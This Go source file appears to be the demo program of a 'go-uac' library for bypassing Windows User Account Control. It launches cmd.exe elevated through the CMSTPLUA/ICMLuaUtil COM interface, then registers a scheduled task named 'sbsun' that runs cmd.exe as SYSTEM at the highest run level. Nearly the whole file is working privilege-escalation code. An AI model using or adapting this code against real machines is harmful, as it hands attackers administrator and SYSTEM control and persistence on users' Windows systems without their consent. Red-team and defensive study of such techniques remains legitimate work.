//go:build windows
// +build windows

package main

import (
	"fmt"
	"go-uac/method"
	"go-uac/ole"
	"log"
)

func main() {
	defer func() {
		fmt.Println("Press [Enter] to exit.")
		_, _ = fmt.Scanln()
	}()

	fmt.Println("", ole.CLSID_CMSTPLUA.String())

	if err := method.RunICMLuaUtil("C:\\windows\\system32\\cmd.exe"); err != nil {
		log.Println(err)
	}

	if err := method.RunTaskService("\\", "sbsun", xml); err != nil {
		log.Println(err)
	}
}

const xml = `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Description>Test Task</Description>
    </RegistrationInfo>
    <Triggers/>
    <Principals>
        <Principal id="Author">
            <UserId>SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
        <AllowHardTerminate>true</AllowHardTerminate>
        <StartWhenAvailable>false</StartWhenAvailable>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <IdleSettings>
            <Duration>PT10M</Duration>
            <WaitTimeout>PT1H</WaitTimeout>
            <StopOnIdleEnd>true</StopOnIdleEnd>
            <RestartOnIdle>false</RestartOnIdle>
        </IdleSettings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>false</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
        <Priority>7</Priority>
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>cmd.exe</Command>
        </Exec>
    </Actions>
</Task>
`
